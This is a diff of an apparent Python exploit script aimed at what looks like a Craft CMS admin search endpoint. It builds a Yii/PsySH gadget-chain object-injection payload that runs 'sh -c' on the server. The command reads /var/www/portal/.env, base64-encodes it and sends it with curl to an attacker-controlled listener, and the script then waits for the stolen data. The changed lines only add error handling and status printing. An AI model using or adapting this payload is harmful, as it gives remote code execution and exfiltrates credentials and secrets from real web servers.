@@ -21,5 +21,7 @@ c="curl -s http://%s:%d/$(%s|base64 -w0)"%(L,P,"cat /var/www/portal/.env")
 b={"as rce":{"__class":"yii\\behaviors\\AttributeTypecastBehavior","__construct()":[{"attributeTypes":{"typecastAfterValidate":["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"]},"typecastAfterValidate":["sh","-c",c]}]},"on *":"self::beforeSave"}
 p=json.dumps({"elementType":e,"siteId":1,"search":"","condition":{"class":k,"elementType":e,"fieldLayouts":[b]}}).encode()
 H={"Content-Type":"application/json","Accept":"application/json","X-CSRF-Token":t,"X-Requested-With":"XMLHttpRequest","Referer":B+"/admin"}
-print(POST(B+"/admin/actions/element-search/search",p,H).status,flush=True)
+try:r=POST(B+"/admin/actions/element-search/search",p,H);print("HTTP",r.status,flush=True)
+except Exception as e:print("PAYLOAD:",e,flush=True)
+print("listening...",flush=True)
 threading.Event().wait()
